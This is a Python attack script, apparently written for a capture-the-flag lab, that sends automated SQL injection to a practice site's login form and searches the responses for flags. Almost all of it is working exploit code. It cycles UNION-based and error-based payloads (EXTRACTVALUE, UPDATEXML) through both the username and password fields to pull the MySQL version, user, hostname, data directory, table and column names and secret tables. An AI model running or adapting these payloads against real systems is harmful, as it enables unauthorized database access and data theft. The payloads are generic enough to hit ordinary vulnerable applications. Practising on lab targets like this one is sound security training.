#!/usr/bin/env python3
import requests
import time
import re

# URL del target
url = "http://hackme1.vulnmachines.com/sqli/Error-based/Post-error-based-single.php"

def extract_info(payload, param="uname"):
    try:
        data = {
            "uname": payload if param == "uname" else "admin",
            "passwd": payload if param == "passwd" else "admin", 
            "login": "login"
        }
        
        print(f"\n[EXTRACTING] {param}: {payload}")
        response = requests.post(url, data=data, timeout=10)
        
        # Buscar información específica en la respuesta
        content = response.text
        
        # Buscar version de MySQL
        version_match = re.search(r'MySQL (\d+\.\d+\.\d+)', content, re.IGNORECASE)
        if version_match:
            print(f"[VERSION] MySQL: {version_match.group(1)}")
        
        # Buscar información de usuario
        user_match = re.search(r'root@[^\s<]+', content, re.IGNORECASE)
        if user_match:
            print(f"[USER] {user_match.group(0)}")
        
        # Buscar nombres de base de datos
        db_match = re.search(r'Database: ([^\s<]+)', content, re.IGNORECASE)
        if db_match:
            print(f"[DATABASE] {db_match.group(1)}")
        
        # Buscar nombres de tablas
        table_matches = re.findall(r'Table: ([^\s<]+)', content, re.IGNORECASE)
        if table_matches:
            print(f"[TABLES] {table_matches}")
        
        # Buscar nombres de columnas
        column_matches = re.findall(r'Column: ([^\s<]+)', content, re.IGNORECASE)
        if column_matches:
            print(f"[COLUMNS] {column_matches}")
        
        # Buscar flags
        flag_matches = re.findall(r'vnm\{[^}]+\}', content, re.IGNORECASE)
        if flag_matches:
            print(f"[FLAGS FOUND] {flag_matches}")
            return flag_matches
        
        # Buscar cualquier información útil
        if "error" in content.lower() or "mysql" in content.lower():
            print(f"[RESPONSE LENGTH] {len(response.text)}")
            # Mostrar parte de la respuesta que contiene errores
            error_section = content[content.lower().find("error"):content.lower().find("error")+500]
            if error_section:
                print(f"[ERROR SECTION] {error_section[:200]}...")
        
        return []
            
    except Exception as e:
        print(f"[ERROR] {e}")
        return []

def main():
    print("=== SQL Injection Information Extraction ===")
    print(f"Target: {url}")
    print("=" * 60)
    
    # Payloads específicos para extraer información
    info_payloads = [
        # Información básica del sistema
        "admin' UNION SELECT version(),user(),database() --",
        "admin' UNION SELECT @@version,@@hostname,@@datadir --",
        
        # Información de la base de datos actual
        "admin' UNION SELECT database(),user(),version() --",
        
        # Listar tablas
        "admin' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --",
        "admin' UNION SELECT table_name,2,3 FROM information_schema.tables --",
        
        # Listar columnas
        "admin' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_schema=database() --",
        "admin' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
        
        # Buscar flags específicamente
        "admin' UNION SELECT flag,2,3 FROM flags --",
        "admin' UNION SELECT value,2,3 FROM flag --",
        "admin' UNION SELECT data,2,3 FROM data --",
        "admin' UNION SELECT secret,2,3 FROM secrets --",
        
        # Buscar en todas las tablas por flags
        "admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE '%flag%' --",
        "admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE '%secret%' --",
        "admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE '%data%' --",
        
        # Error-based information extraction
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x7e)) --",
    ]
    
    all_flags = []
    
    # Probar payloads en uname
    print("\n[TESTING UNAME PARAMETER]")
    for payload in info_payloads:
        flags = extract_info(payload, "uname")
        all_flags.extend(flags)
        time.sleep(1)
    
    # Probar payloads en passwd
    print("\n[TESTING PASSWD PARAMETER]")
    for payload in info_payloads:
        flags = extract_info(payload, "passwd")
        all_flags.extend(flags)
        time.sleep(1)
    
    # Resumen de flags encontradas
    if all_flags:
        print(f"\n[SUMMARY] Flags found: {set(all_flags)}")
    else:
        print("\n[SUMMARY] No flags found in this round")

if __name__ == "__main__":
    main()